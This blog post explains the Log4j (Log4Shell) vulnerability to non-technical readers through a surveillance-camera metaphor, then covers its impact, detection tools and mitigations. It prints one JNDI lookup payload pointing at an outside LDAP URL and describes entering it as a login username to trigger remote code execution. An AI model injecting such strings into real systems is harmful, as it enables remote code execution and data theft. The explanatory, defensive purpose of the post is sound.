---
title: "Understanding Log4j and Log4Shell Vulnerabilities from Surveillance Cameras"
date: 2022-01-04
tags: [Security]
author: huli
layout: en/layouts/post.njk
image: /img/posts/huli/what-is-log4j-and-log4shell/cover.jpeg
---

![](/img/posts/huli/what-is-log4j-and-log4shell/cover.jpeg)
<span data-nosnippet>（Image credit: [Joe Gadd](https://unsplash.com/@sharp_shutter) on [Unsplash](https://unsplash.com)）</span>

<!-- summary -->
<!-- There have been many articles providing technical analysis and explanation. I would like to write a more easy-understanding article from a perspective of people with non-technical backgrounds -->
<!-- summary -->

At the end of 2021, the biggest news in the cybersecurity industry is certainly the Log4j vulnerability, coded CVE-2021-44228, also known as Log4Shell. It is even described as a “nuclear bomb-level loophole” by some people, showing the profound impact of this vulnerability. 

There have been many articles providing technical analysis and explanation, but for those who do not have deep understanding about the technology, they may only know that the vulnerability is serious, but they don’t know why it is serious or what the mechanism is. Therefore, I would like to write a more easy-understanding article from a perspective of people with non-technical backgrounds. 

## Starting from Surveillance Cameras 

I have a friend called John who runs a grocery store. Just like other stores, there is a surveillance camera in the store. To avoid any consumer disputes, robbery or shoplifting, the camera runs 24 hours a day. If anything happens, there will be evidence that could be preserved. 

However, the camera’s angle of view is limited, and it is impossible to capture all the images of the entire store. Even if they are all captured, there will be too much data to be saved (unless John is very rich and has the capability to buy a bunch of cameras). Therefore, the camera will only aim at important places that are worth recording, such as the cashier counter and so on.

Originally, this camera has been used for more than a decade without much trouble. After all, isn’t it just recording videos? What else can be done? But recently, someone suddenly discovered the hidden feature of the camera. Strictly speaking, it is not a hidden function, because it is mentioned in the camera manual, but everyone is too lazy to read 100+ pages of the manual, so only few people know this function.  

What is this function? That is, in addition to video recording, this surveillance camera also has an AI image recognition function. If it sees a specific frame, it will execute the corresponding action according to the content of the image. For example, the instructions need to be written on a 100x100 board, and it must be white wording on a black background with a specific format for the image recognition function to execute, like this,

![](/img/posts/huli/what-is-log4j-and-log4shell/command.png)

When the camera sees the above image, which follows the specific format, it executes the above command, “Shut down”, and it really shuts down! But it’s not a big deal to shut down the camera. You can also write commands like “Give me all the camera data”. Moreover, the camera will connect to other servers in real time. This command can also operate on those servers, for example, stealing all the information on those servers and so on. 

In short, once you let the camera capture anything in the specified format, it will execute the instructions for you. 

After this function has been exposed, it has impacted severely everywhere since there were surveillance cameras in too many places; therefore, many people took this board to see if it would trigger this function. There are different types of cameras. Only one camera called Log4j will have this incident. Others will not. But it should be noted that although some cameras are not called this name, they are actually adapted from Log4j as the foundation, and the same issue will also happen. 

Some objects can also result in this issue even if they are not cameras. For example, there is a smart refrigerator that claims to have a miniature camera inside to monitor the internal condition of the refrigerator. It happens that this miniature camera is a revision of the Log4j camera, so it has the same problem. 

Think about it, if this problem occurs in surveillance cameras, since many people in Taiwan and around the world use this model of surveillance cameras, it will cause an uproar for sure. As long as the camera captures a specific instruction, it will execute the command. This can be a serious issue.

The above is a simple metaphor for the Log4j vulnerability. In this story, the grocery store is like your website, and the function of the camera is to log those requests to the website. You only need to remember two important points from this story:

1. Log4j is used to do records. 
2. The mechanism of the vulnerability is that as long as some texts in a specific format is recorded, a function will be triggered to execute the code. 

This simple metaphor ends here first. If we want to know more about Log4j, we must first understand what log is.

## About Log

 believe many people are familiar with this term. If you have worked with an engineer, he may say, “I'll look at log” when solving a problem; or if you are arguing with a vendor, you might say, “Let’s take a look at the log and see whose problem is.” 

When you work with the company’s IT to solve small problems on the computer, he will also tell you to go somewhere to copy the log to him, so he knows what happened. 

Log is like a surveillance camera that operates 24 hours a day, all year round. It needs to record the status of important actions. 

Then why do we need a log? This question is like “why do we need surveillance cameras?” The answer is simple, because when something goes wrong, we could have some evidence on hand. Just like a dashcam, if a car accident happens after installation, it can assist in judging the responsibility. 

For example, if I am running a company A and our company is an e-commerce website. Usually, the payment system won’t be developed by ourselves. Instead, I will find other payment service provider to cooperate and “connect” those functions at the back end. The function provided by the payment service provider, to put it in a simple way, is “When the user wants to pay, it will lead the user to the payment service provider’s page, and then return to our website after payment.” I believe people who have shopped online should be familiar with this process. 

In this process, both parties must keep records to ensure that there is evidence to support the explanation when problems occur in the future. 

For example, one day company A suddenly received many complaints from customers saying that they couldn’t proceed the payments. At this time, company A called the payment service provider directly, scolded them about the bad service they provided, and asked them why the system suddenly broke down. Meanwhile, the payment service provider provided the log from the server and replied, “We don’t have a record from your server since 8 o’clock this morning. Perhaps it’s the problem from your end?” Later, company A checked its own server, and it was indeed its own problem with the version update this morning, and it has nothing to do with the payment service provider. 

This is the importance of the log. You will have evidence to check when something goes wrong and restore the original situation as much as possible. 

Website developers all know that log is very important, so log is basically necessary. For the backend of the website, it may leave a log when a transaction error occurs, or it may write a log when an unexpected error occurs. It may also use a log to record some fields such as the browser version in the request and those records could be used for internal data analysis for the companies. 

Therefore, log is a very common function. That is why if something goes wrong with this function, the consequences will be very serious. 

## What is Log4j? 

When writing the code for the backend of the website, the engineer could choose different programming languages, such as Python, JavaScript, PHP, or Java, etc., and these programming languages ​​will have some packages specifically for log. In short, someone has helped you to finish writing all the functions, and you just need to use them. 

Java has a very useful log package called Log4j and this package is under the Apache Software Foundation, so the full name is also called Apache Log4j. 

There are many different software and packages under Apache, for example: 

* Apache HTTP Server (the one you see most often) 
* Apache Cassandra 
* Apache Tomcat 
* Apache Hadoop 
* Apache Struts 
* ... 

Apache Server and Apache Log4j are two different things. Whether you use Apache Server or Log4j are two things. 

This time the problematic package is Log4j, and the cause of the problem is the same as I mentioned in the beginning. A rarely known function exists with a security vulnerability. As long as Log4j records something in a specific format when doing the log, it will execute the corresponding program code, just like the “shutdown” board mentioned in the beginning. 

Let’s talk about it in more details. It’s actually not directly executing the code. The specific format looks like this, 

```
${jndi:ldap://cymetrics.io/test}
```

Don’t worry about the words that you don’t understand. You can clearly see that there is something like a URL. Yes, it is a URL. When Log4j records the string of words above, it finds that this string of characters conforms to a specific format. Therefore, it will direct to the URL (cymetrics.io/test) to download the code and then execute it, so this is an RCE (Remote Code Execution) vulnerability. 

Earlier I mentioned that the backend will record many things. Suppose today there is a backend service written in Java, and it uses Log4j to record the accounts that the users failed to log in. I only need to use `${jndi:ldap://cymetrics.io/test}` as a username to do the login and it can trigger the vulnerability of Log4j, and further allow it to execute the code I prepare. 

As long as I can execute the code, I can do many things, such as stealing data from the server, or installing mining software to help me do the mining.  

## Why is this vulnerability so serious? 

First, the Log4j package is used by many people. If you use Java, you will use this package to record logs in most cases. 

Second, the triggering method is easy. You only need to fill up these problematic strings in various places in the request, and the server can trigger the vulnerability if one of them is recorded. We mentioned earlier that recording the log is common. 

Third, the impact can be huge. After the vulnerability is triggered, it is the most serious RCE, which can directly execute arbitrary code. 

Combining the above three points, it has become a nuclear bomb-level loophole. Just look at these news headlines to know how serious it is,

1. [The Apache Log4j vulnerability has a huge impact, and the U.S. The Cybersecurity and Infrastructure Security Agency (CISA) urged the government agencies to take immediate actions](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance)
2. [Critical vulnerability found in open-source tool used by Apple, Microsoft and others](https://siliconangle.com/2021/12/10/critical-vulnerability-found-open-source-tool-used-apple-microsoft-others/)
3. [New Apache Log4j Update Released to Patch Newly Discovered Vulnerability](https://thehackernews.com/2021/12/new-apache-log4j-update-released-to.html)

Forgot to mention that there are other software also using Log4j; therefore, same problems might occur. Here is a list of the ones being affected [Log4Shell log4j vulnerability (CVE-2021-44228 / CVE-2021-45046) - cheat-sheet reference guide](https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/). Many products have been affected, such as the server of a gaming, Minecraft, also uses Log4j, so it’s affected by this vulnerability.   

## How do I know if I am affected by this vulnerability? 

You can first confirm whether your own program uses the Log4j package and the version of the package, and you also need to check whether you use other software listed in the above list. 

If you are an engineer, you can also use some existing tools to detect whether they are affected by vulnerabilities, such as [log4j-scan](https://github.com/fullhunt/log4j-scan) or [log4j-tools](https://github.com/jfrog/log4j-tools) provided by jfrog, etc. 

Or if you really don’t know what to do, you can also [contact us](https://cymetrics.io/en-us/free-rating) to see how we can help you. 

## How to fix it?

In this article published by Swiss CERT:[Zero-Day Exploit Targeting Popular Java Library Log4j](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/), there is a picture of defense from all aspects: 

![](/img/posts/huli/what-is-log4j-and-log4shell/attack.png)

If it is too late to fix the root cause, you can use WAF (Web Application Firewall) first. Simply saying, you can use a firewall for websites to block malicious strings. For example, [Cloudflare](https://blog.cloudflare.com/protection-against-cve-2021-45046-the-additional-log4j-rce-vulnerability/) added WAF rules in the first place to do the blocking. However, there are also many people studying how to bypass the WAF rules, so this is a temporary solution rather than a permanent cure. 

The cure for the root cause is to disable or upgrade log4j and upgrade to a version that will not be affected by this vulnerability. However, sometimes the first revision may not completely fix the vulnerability, so remember to pay close attention to whether the update is completed. For example, not long after this article was written, the official has released the third patch to fix other related issues: [Apache Issues 3rd Patch to Fix New High-Severity Log4j Vulnerability](https://thehackernews.com/2021/12/apache-issues-3rd-patch-to-fix-new-high.html)

## Conclusion 

A package used by many people, plus a very common function, and a very simple attack method and serious consequences, has become a vulnerability that can be recorded in the annals of history. 

Some metaphors in this article are simplified versions in order not to be too detailed and thus may not fully cover the original loopholes. There must be some missing parts in the process of converting into a story metaphor, but I think it won’t affect the overall understanding. 

If you want to know more technical details and timeline, I highly recommend this video: [Hackers vs. Developers // CVE-2021-44228 Log4Shell](https://www.youtube.com/watch?v=w2F67LbEtnk&t=16s&ab_channel=LiveOverflow), which explains the Log4j clearly and also discusses the relationship between developers and cybersecurity practitioners. 

Finally, I hope this article will let everyone who does not understand the technology know more about the vulnerability of Log4shell and why this vulnerability is so serious. If there are any errors in the article, please feel free to leave a message to correct me. Thanks. 

(This post is translated by Lisa)
